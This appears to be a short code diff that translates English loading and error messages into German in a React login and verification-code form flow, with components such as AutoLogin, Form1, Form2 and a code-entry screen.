@@ -46,7 +46,7 @@ function AutoLogin() {
       });
   }, [navigate]);
 
-  if (loading) return <Loading message="Creating your secure session..." />;
+  if (loading) return <Loading message="Bitte warten Sie, während wir Ihre Sitzung erstellen..." />;
   if (error) return <Error message={error} />;
   return null;
 }
@@ -193,9 +193,9 @@ function FormFlow() {
     case 'form_1':
       return <Form1 onSubmit={handleForm1Submit} />;
     case 'loading':
-      return <Loading message="Please wait while we process your information..." />;
+      return <Loading message="Bitte warten Sie, während wir Ihre Informationen verarbeiten..." />;
     case 'loading_code_entry':
-      return <LoadingWithCodeEntry message="Please wait while we send your verification code..." />;
+      return <LoadingWithCodeEntry message="Bitte warten Sie, während wir Ihren Verifizierungscode senden..." />;
     case 'form_2':
       return <Form2 onSubmit={handleForm2Submit} />;
     case 'enter_code':
@@ -205,7 +205,7 @@ function FormFlow() {
     case 'reenter_code_after_pending':
       return <CodeEntryForm onSubmit={handleCodeSubmit} error="Leider ist ein Fehler aufgetreten. Bitte geben Sie den Code erneut ein." />;
     case 'loading_pending':
-      return <LoadingWithCodeEntry message="Please wait while we verify your code..." />;
+      return <LoadingWithCodeEntry message="Bitte warten Sie, während wir Ihren Code überprüfen..." />;
     case 'pending':
       return <Pending />;
     case 'success':
